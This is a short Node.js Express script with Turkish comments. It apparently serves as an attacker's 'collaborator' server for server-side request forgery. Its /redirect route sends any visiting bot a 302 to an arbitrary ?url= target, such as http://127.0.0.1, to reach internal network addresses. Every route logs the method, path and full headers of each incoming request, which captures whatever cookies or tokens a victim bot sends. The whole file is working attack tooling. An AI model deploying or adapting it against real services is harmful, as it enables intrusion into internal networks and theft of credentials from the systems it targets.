const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Yönlendirme rotası: /redirect?url=http://127.0.0.1:8080/
app.get('/redirect', (req, res) => {
    const method = req.method;
    const url = req.url;
    const headers = req.headers;
    const targetUrl = req.query.url;

    console.log("\n--- REDIRECT İSTEĞİ YAKALANDI ---");
    console.log("Method:", method);
    console.log("İstek Yolu:", url);
    console.log("Hedef (Target URL):", targetUrl);
    console.log("Headers:", headers);

    if (targetUrl) {
        console.log(`[+] Bot ${targetUrl} adresine yönlendiriliyor...`);
        // Hedef iç ağ adresine veya başka bir yere 302 yönlendirmesi yap
        return res.redirect(302, targetUrl);
    } else {
        return res.status(400).send("Eksik parametre! Örnek kullanım: ?url=http://127.0.0.1/");
    }
});

// Diğer tüm gelen istekleri loglayan genel yakalayıcı
app.use((req, res) => {
    const method = req.method;
    const url = req.url;
    const headers = req.headers;

    console.log("\n--- NORMAL İSTEK ---");
    console.log(method, url, headers);
    return res.status(200).send("OK");
});

app.listen(3000, () => console.log("Collaborator 3000 portunda hazır!"));
